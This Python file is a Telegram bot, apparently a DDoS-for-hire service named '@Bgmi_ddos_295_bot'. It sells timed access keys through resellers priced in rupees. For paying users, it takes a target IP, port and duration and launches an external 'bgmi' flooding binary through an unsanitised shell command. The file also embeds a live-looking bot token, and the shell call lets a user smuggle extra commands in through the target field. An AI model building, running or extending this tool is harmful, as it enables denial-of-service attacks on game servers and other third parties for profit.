# FINAL WORKING CODE - ALL ERRORS FIXED

import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
from telebot import types
from dateutil.relativedelta import relativedelta

# Token ko seedhe code me daal diya gaya hai taaki koi extra setup na karna pade
bot = telebot.TeleBot('8192556082:AAGy2H24ojeJHohiOyKg1y1gpRltoldjqEk')

# Admin user ID
admin_id = {"5906827506"}

# File paths
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
BOT_LINK = "@Bgmi_ddos_295_bot"
escaped_bot_link = BOT_LINK.replace('_', '\\_')

# Key costs
KEY_COST = {"1hour": 30, "5hours": 70, "1day": 120, "7days": 600, "1month": 1500}

# In-memory data
users = {}
keys = {}
resellers = {}
last_attack_time = {}

# --- Data Handling Functions ---
def load_data():
    global users, keys, resellers
    users = read_json_file(USER_FILE)
    keys = read_json_file(KEY_FILE)
    resellers = read_json_file(RESELLERS_FILE)

def read_json_file(filename):
    try:
        with open(filename, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_json_file(data, filename):
    with open(filename, "w") as file:
        json.dump(data, file, indent=4)

def save_users():
    save_json_file(users, USER_FILE)

def save_keys():
    save_json_file(keys, KEY_FILE)
    
def save_resellers():
    save_json_file(resellers, RESELLERS_FILE)

# --- Helper Functions ---
def create_random_key(length=15):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return f"BAAP KA KEY-{random_key}"

def add_time_to_current_date(**kwargs):
    return datetime.datetime.now() + relativedelta(**kwargs)

def log_command(user_id, target, port, time_duration):
    try:
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"UserID: {user_id}"
        log_entry = (f"| ➖ 𝗨𝘀𝗲𝗿𝗡𝗮𝗺𝗲 : @{username}\n"
                     f" | ➖ 𝗧𝗶𝗺𝗲 : {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n"
                     f" | ➖ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗣 : {target}\n"
                     f" | ➖ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗣𝗢𝗥𝗧 : {port}\n"
                     f" | ➖ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 : {time_duration}\n\n")
        with open(LOG_FILE, "a") as file:
            file.write(log_entry)
    except Exception as e:
        print(f"Error logging command: {e}")

# --- Bot Command Handlers ---

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [types.KeyboardButton("🚀 Attack"), types.KeyboardButton("👤 My Info"), types.KeyboardButton("🎟️ Redeem Key")]
    markup.add(*buttons)
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 BAAP KA BOT bot !", reply_markup=markup)
    bot.send_message(message.chat.id, "*➖𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 👀*", parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return
    help_text = """
⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:* ⚡
🏦 `/addreseller <user_id> <balance>` - Empower a new reseller! 🔥
🔑 `/genkey <duration>` - Craft a VIP key of destiny! 🛠️
📜 `/logs` - Unveil recent logs & secret records! 📂
👥 `/users` - Summon the roster of authorized warriors! ⚔️
❌ `/remove <user_id>` - Banish a user to the void! 🚷
🏅 `/resellers` - Inspect the elite reseller ranks! 🎖️
💰 `/addbalance <reseller_id> <amount>` - Bestow wealth upon a reseller! 💎
🗑️ `/removereseller <reseller_id>` - Erase a reseller’s existence! ⚰️
♻️ `/history` - Check the Key Generation History!
"""
    bot.reply_to(message, help_text, parse_mode='Markdown')

# --- Main Feature Handlers ---

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() > expiration_date:
                bot.reply_to(message, "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄❗️")
                del users[user_id]
                save_users()
                return
        except (ValueError, TypeError):
            bot.reply_to(message, "Error with your access data. Contact admin.")
            del users[user_id]
            save_users()
            return

        COOLDOWN_PERIOD = 60
        if user_id in last_attack_time and (datetime.datetime.now() - last_attack_time[user_id]).total_seconds() < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            bot.reply_to(message, f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
            return
        
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲")
        bot.register_next_step_handler(message, process_attack_details)
    else:
        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nContact an admin for access.", parse_mode='Markdown')

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()
    if len(details) != 3:
        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. Use: <ip> <port> <time>")
        return
    
    target, port_str, time_str = details
    try:
        port = int(port_str)
        time_duration = int(time_str)
        if time_duration > 500:
            bot.reply_to(message, "❗️𝗘𝗿𝗿𝗼𝗿 : 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗲𝗻 500 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️")
            return
        
        full_command = f"./bgmi {target} {port} {time_duration} 900"
        log_command(user_id, target, port, time_duration)
        username = message.from_user.username or "No_username"
        
        subprocess.Popen(full_command, shell=True)
        bot.reply_to(message, f"‼️ 𝗛𝗲𝗹𝗹𝗼 @{username},  𝗬𝗼𝘂𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗼𝗻  {target} : {port} 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗶𝗻 {time_duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.", parse_mode='Markdown')
        
        threading.Timer(time_duration, lambda: bot.send_message(message.chat.id, "➖ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ! ✅")).start()
        last_attack_time[user_id] = datetime.datetime.now()
    except ValueError:
        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁.")
    except FileNotFoundError:
        bot.reply_to(message, "Attack script 'bgmi' not found. Contact admin.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "*𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆 :*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()
    if key in keys:
        duration = keys[key]["duration"]
        
        if duration == "1hour": expiration_time = add_time_to_current_date(hours=1)
        elif duration == "5hours": expiration_time = add_time_to_current_date(hours=5)
        elif duration == "1day": expiration_time = add_time_to_current_date(days=1)
        elif duration == "7days": expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month": expiration_time = add_time_to_current_date(months=1)
        else:
            bot.reply_to(message, "Invalid duration in key.")
            return

        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        bot.reply_to(message, f"➖ 𝗔𝗰𝗰??𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 !\n\n𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻: {users[user_id]}")
    else:
        bot.reply_to(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.from_user.username or "No_username"
    role = "Guest"
    info = ""

    if user_id in admin_id:
        role = "Admin"
        info = "You have full access."
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        info = f"💰 *𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘* : {balance} 𝗥𝘀"
    elif user_id in users:
        role = "User"
        info = f"🕘 *𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻* : {users.get(user_id, 'Error')}"
    else:
        info = "You have no active plan."

    escaped_username = username.replace('_', '\\_')
    response = (f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
                f"ℹ️ *𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲* : @{escaped_username}\n"
                f"🆔 *𝗨𝘀𝗲𝗿𝗜𝗗* : `{user_id}`\n"
                f"🚹 *𝗥𝗼𝗹𝗲* : {role}\n"
                f"{info}")
    bot.reply_to(message, response, parse_mode='Markdown')

# --- Admin & Reseller Commands ---

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /genkey <duration>\nDurations: 1hour, 5hours, 1day, 7days, 1month", parse_mode='Markdown')
        return

    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "*❌ Invalid duration specified*", parse_mode='Markdown')
        return

    cost = KEY_COST[duration]
    
    # Logic for Admin
    if user_id in admin_id:
        key = create_random_key()
        keys[key] = {"duration": duration}
        save_keys()
        response = f"➖ *Admin Key Generated* ✅\n\n*𝗞𝗘𝗬* : `{key}`\n*𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻* : {duration}"
    
    # Logic for Reseller
    elif user_id in resellers:
        current_balance = resellers.get(user_id, 0)
        if current_balance >= cost:
            resellers[user_id] -= cost
            save_resellers()
            key = create_random_key()
            keys[key] = {"duration": duration}
            save_keys()
            response = (f"➖ *Key Generated* ✅\n\n*𝗞𝗘𝗬* : `{key}`\n*𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻* : {duration}\n"
                        f"*Cost* : {cost} Rs\n*Remaining Balance* : {resellers[user_id]} Rs")
        else:
            response = f"*Insufficient Balance*. Required: {cost} Rs, You have: {current_balance} Rs"
    
    else:
        response = "⛔️ *Access Denied: Owner/Reseller Only Command*"
        
    bot.reply_to(message, response, parse_mode='Markdown')

# ... (All other admin/reseller commands like addreseller, remove, logs, etc.)
@bot.message_handler(commands=['addreseller', 'removereseller', 'addbalance', 'remove', 'users', 'resellers', 'logs', 'history', 'broadcast'])
def admin_commands(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id and message.text.split()[0] != '/balance': # Allow balance check for resellers
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    command = message.text.split()
    cmd = command[0]

    if cmd == '/addreseller':
        if len(command) != 3:
            bot.reply_to(message, "Usage: /addreseller <user_id> <balance>")
            return
        reseller_id, balance_str = command[1], command[2]
        if reseller_id not in resellers:
            try:
                resellers[reseller_id] = int(balance_str)
                save_resellers()
                bot.reply_to(message, f"Reseller {reseller_id} added with balance {balance_str} Rs.")
            except ValueError:
                bot.reply_to(message, "Invalid balance amount.")
        else:
            bot.reply_to(message, f"Reseller {reseller_id} already exists.")
    
    elif cmd == '/removereseller':
        if len(command) != 2:
            bot.reply_to(message, "Usage: /removereseller <user_id>")
            return
        if command[1] in resellers:
            del resellers[command[1]]
            save_resellers()
            bot.reply_to(message, f"Reseller {command[1]} removed.")
        else:
            bot.reply_to(message, "Reseller not found.")

    elif cmd == '/addbalance':
        if len(command) != 3:
            bot.reply_to(message, "Usage: /addbalance <reseller_id> <amount>")
            return
        reseller_id, amount_str = command[1], command[2]
        if reseller_id in resellers:
            try:
                resellers[reseller_id] += int(amount_str)
                save_resellers()
                bot.reply_to(message, f"Added {amount_str} Rs to {reseller_id}. New balance: {resellers[reseller_id]} Rs.")
            except ValueError:
                bot.reply_to(message, "Invalid amount.")
        else:
            bot.reply_to(message, "Reseller not found.")

    elif cmd == '/remove':
        if len(command) != 2:
            bot.reply_to(message, "Usage: /remove <user_id>")
            return
        if command[1] in users:
            del users[command[1]]
            save_users()
            bot.reply_to(message, f"User {command[1]} removed.")
        else:
            bot.reply_to(message, "User not found.")

    elif cmd == '/users':
        if not users:
            bot.reply_to(message, "No authorized users found.")
            return
        response = "👥 *Authorized Users* 👥\n\n" + "\n".join([f"`{uid}` expires on {exp}" for uid, exp in users.items()])
        bot.reply_to(message, response, parse_mode='Markdown')

    elif cmd == '/resellers':
        if not resellers:
            bot.reply_to(message, "No resellers found.")
            return
        response = "🏅 *Resellers* 🏅\n\n" + "\n".join([f"`{rid}` has balance {bal} Rs" for rid, bal in resellers.items()])
        bot.reply_to(message, response, parse_mode='Markdown')

    elif cmd == '/logs':
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file, caption="Attack Logs")
        else:
            bot.reply_to(message, "Logs are empty.")
            
    elif cmd == '/history':
         if os.path.exists("key_history.txt") and os.stat("key_history.txt").st_size > 0:
            with open("key_history.txt", "rb") as file:
                bot.send_document(message.chat.id, file, caption="Key Generation History")
         else:
            bot.reply_to(message, "Key history is empty.")

    elif cmd == '/broadcast':
        if len(command) < 2:
            bot.reply_to(message, "Usage: /broadcast <message>")
            return
        broadcast_msg = message.text.split(' ', 1)[1]
        all_user_ids = set(users.keys()) | set(resellers.keys()) | admin_id
        sent_count = 0
        for uid in all_user_ids:
            try:
                bot.send_message(uid, f"📢 *Broadcast:*\n\n{broadcast_msg}", parse_mode='Markdown')
                sent_count += 1
            except Exception as e:
                print(f"Failed to send broadcast to {uid}: {e}")
        bot.reply_to(message, f"Broadcast sent to {sent_count} users.")


# --- Bot Startup ---
if __name__ == "__main__":
    print("Loading data...")
    load_data()
    print("Bot is starting polling...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"An error occurred during polling: {e}")
        time.sleep(10)